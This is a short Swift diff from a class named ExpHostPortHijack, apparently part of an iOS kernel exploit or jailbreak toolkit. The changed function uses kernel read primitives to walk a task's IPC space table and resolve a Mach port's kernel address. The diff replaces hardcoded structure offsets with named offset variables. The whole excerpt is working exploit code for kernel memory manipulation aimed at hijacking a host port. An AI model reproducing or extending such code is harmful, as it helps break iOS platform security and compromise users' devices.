@@ -175,18 +175,19 @@ final class ExpHostPortHijack {
     
     private func resolveMachPort(task: UInt64, portName: UInt32) -> UInt64 {
         // task->itk_space
-        let itkSpace = ds_kreadptr(task + 0x308) // Offset may vary on iOS 18, check ds_get_itk_space
+        let itkSpace = ds_kread64(task + UInt64(off_task_itk_space))
         if itkSpace == 0 { return 0 }
         
         // itk_space->is_table
-        let isTable = ds_kreadptr(itkSpace + 0x20) // Offset may vary
+        let isTable = ds_kread64(itkSpace + UInt64(off_ipc_space_is_table))
         if isTable == 0 { return 0 }
         
         let index = portName >> 8
-        let entryAddr = isTable + UInt64(index) * 0x18 // ipc_entry size = 0x18
+        let entrySize = UInt64(sizeof_ipc_entry)
+        let entryAddr = isTable + UInt64(index) * entrySize
         
         // ipc_entry->ie_object
-        let portKaddr = ds_kreadptr(entryAddr + 0x0)
+        let portKaddr = ds_kread64(entryAddr + UInt64(off_ipc_entry_ie_object))
         return portKaddr
     }
     
